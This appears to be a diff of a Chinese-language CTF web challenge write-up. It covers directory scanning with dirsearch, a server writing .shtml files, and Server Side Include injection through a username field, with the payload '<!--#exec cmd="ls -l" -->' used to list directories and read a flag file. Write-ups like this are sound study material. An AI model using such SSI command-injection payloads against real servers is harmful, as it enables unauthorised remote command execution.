@@ -2,12 +2,16 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221217203322.png|600]]
+
 为什么两个框框的`placeholder`都是`username`啊喂==
+
 猜密码没猜中，快进到下一步
 
 ---
 使用`dirsearch`扫目录
+
 ![[Pasted image 20221217205515.png]]
 ```php
 <?php
@@ -66,29 +70,39 @@ while True:
 
 ---
 接下来服务端在`public`目录下面写入了一个随机名字的`shtml`文件
+
 `[!] Header error ...`暗示要去看响应头
+
 ![[Pasted image 20221217213950.png]]
+
 ![[Pasted image 20221217214621.png|700]]
 
 ---
 然后是`shtml`的[新知识](https://zh.wikipedia.org/zh-cn/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C)
+
 总之就是可以利用这个
 ```
 <!--#exec cmd="ls -l" -->
 ```
 来执行命令
+
 这里通过`username`注入
 ```shell
 ls
 ```
+
 ![[Pasted image 20221217215146.png|700]]
+
 ```shell
 ls ..
 ```
+
 ![[Pasted image 20221217215251.png|700]]
+
 ```shell
 cat ../flag_990c66bf85a09c664f0b6741840499b2
 ```
+
 ![[Pasted image 20221217215409.png|700]]
 
 #Web #PHP #HTTP #Header #RCE #SHTML #HTML #目录爆破 #md5 
